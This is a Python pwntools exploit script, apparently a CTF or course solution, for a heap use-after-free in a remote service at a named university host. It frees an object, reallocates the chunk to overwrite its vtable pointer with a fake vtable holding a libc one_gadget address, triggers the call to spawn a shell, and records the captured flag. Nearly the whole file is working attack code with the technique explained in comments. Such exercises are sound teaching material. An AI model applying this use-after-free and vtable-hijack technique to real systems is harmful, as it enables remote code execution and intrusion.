import struct 
import socket 
from pwn import *

host = "lettieri.iet.unipi.it"
#host = "localhost"
port = 7003

# aslr is not enabled
libc_base_address = 0x00007ffff7e06000
one_gadget_offset = 0x448a3 
one_gadget_address = libc_base_address + one_gadget_offset

create_object = b"o"
delete_object = b"D"
use_object = b"u"
assign = b"a"
delete = b"d"
search = b"s"
create = b"c"
quit = b"q"

base = b"b"
derived1 = b"1"
derived2 = b"2"

# create object:    o-key-type {b,1,2}-int
#   it prints out the address where the object is put

# idea: create an object with a random integer. The chunk size will be 32:
#   ideally because you need to have the integer + the vtable pointer + 16

# then delete the object. The chunk will go in its corresponding fast bin, the pointer is dangling

# create a normal key and overwrite the vtable pointer, pointing to a fake vtable containing one_gadget address 

# call use object will now call whatever you wrote in the vtable

malloc1 = 0x61a030
malloc2 = malloc1 + 32

key1 = b"1"
key2 = b"2"
key3 = b"3"

buf = b""
buf += create_object + key1 + base + b"63"
buf += delete_object + key1
buf += create + key2 + b"16"
buf += assign + key2 + struct.pack("Q", malloc2) + struct.pack("Q", 1) # point to fake vtable

buf += create + key3 + b"16" # create a fake vtable
buf += assign + key3 + struct.pack("Q", one_gadget_address) + struct.pack("Q", 1)

buf += use_object + key1

with remote(host, port) as conn:
    conn.send(buf)
    conn.interactive()

# NSH{Invasion_of_the_body_snatchers}
